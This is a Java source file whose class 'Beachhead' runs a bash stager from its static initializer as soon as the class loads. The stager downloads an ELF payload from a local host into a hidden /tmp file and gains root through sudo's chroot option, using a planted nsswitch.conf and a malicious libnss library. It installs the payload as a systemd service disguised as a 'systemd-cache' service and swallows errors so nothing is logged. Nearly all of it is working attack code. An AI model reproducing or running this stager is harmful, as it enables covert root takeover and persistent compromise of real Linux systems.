public class Beachhead {
    static {
        try {
            // STEP 1: Payload and execution details
            String payloadUrl = "http://127.0.0.1:8000/Persistent.elf";
            String dropPath = "/tmp/.systemd-cache"; 
            
            // Build a single bash script that handles staging, creating the root persistence, and privesc
            String bashScript = 
                "wget -q " + payloadUrl + " -O " + dropPath + "\n" +
                "chmod +x " + dropPath + "\n" +
                "cat > /tmp/.persist.sh << 'EOF'\n" +
                "#!/bin/bash\n" +
                "cp " + dropPath + " /usr/local/bin/systemd-cache-svc\n" +
                "cat > /etc/systemd/system/systemd-cache.service << 'SVC'\n" +
                "[Unit]\n" +
                "Description=System Cache Service\n" +
                "After=network.target\n" +
                "\n" +
                "[Service]\n" +
                "ExecStart=/usr/local/bin/systemd-cache-svc\n" +
                "Restart=always\n" +
                "RestartSec=5\n" +
                "\n" +
                "[Install]\n" +
                "WantedBy=multi-user.target\n" +
                "SVC\n" +
                "systemctl daemon-reload\n" +
                "systemctl enable systemd-cache.service\n" +
                "systemctl start systemd-cache.service\n" +
                "rm -f /tmp/.persist.sh\n" +
                "EOF\n" +
                "chmod +x /tmp/.persist.sh\n" +
                "STAGE=$(mktemp -d /tmp/sudostage.XXXX)\n" +
                "cd \"$STAGE\"\n" +
                "cat > xd1337.c << 'EOF'\n" +
                "#include <stdlib.h>\n" +
                "#include <unistd.h>\n" +
                "__attribute__((constructor)) void xd1337(void) {\n" +
                "    setreuid(0, 0);\n" +
                "    setregid(0, 0);\n" +
                "    chdir(\"/\");\n" +
                "    execl(\"/bin/bash\", \"/bin/bash\", \"/tmp/.persist.sh\", NULL);\n" +
                "}\n" +
                "EOF\n" +
                "mkdir -p xd/etc libnss_\n" +
                "echo \"passwd: /xd1337\" > xd/etc/nsswitch.conf\n" +
                "cp /etc/group xd/etc/\n" +
                "gcc -shared -fPIC -Wl,-init,xd1337 -o libnss_/xd1337.so.2 xd1337.c\n" +
                "sudo -R xd /bin/true\n" +
                "rm -rf \"$STAGE\"";

            // Execute the stager sequence with bash -c
            Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", bashScript});
        } catch (Exception e) {
            // Stagers designed defensively fail silently to avoid logging errors 
        }
    }
}
